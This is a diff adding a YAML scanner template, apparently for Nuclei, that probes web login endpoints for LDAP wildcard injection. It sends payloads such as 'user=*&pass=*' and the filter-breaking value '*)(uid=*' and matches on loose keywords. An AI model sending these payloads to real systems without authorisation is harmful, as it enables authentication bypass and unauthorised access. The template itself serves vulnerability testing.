@@ -1,0 +1,39 @@
+id: ldap-wildcard-injection
+info:
+  name: LDAP Wildcard Injection
+  author: AniipID
+  severity: high
+  description: Tests for LDAP injection using wildcard characters to bypass authentication
+  tags: ldap,injection,wildcard,auth-bypass
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?user=*&pass=*"
+      - "{{BaseURL}}?uid=*"
+      - "{{BaseURL}}?cn=*"
+      - "{{BaseURL}}?username=*)(uid=*"
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "root"
+          - "user"
+          - "password"
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/ldap/login"
+      - "{{BaseURL}}/api/auth"
+    body: "username=*&password=*"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        words:
+          - "token"
+          - "authenticated"
+          - "session"
+        condition: or
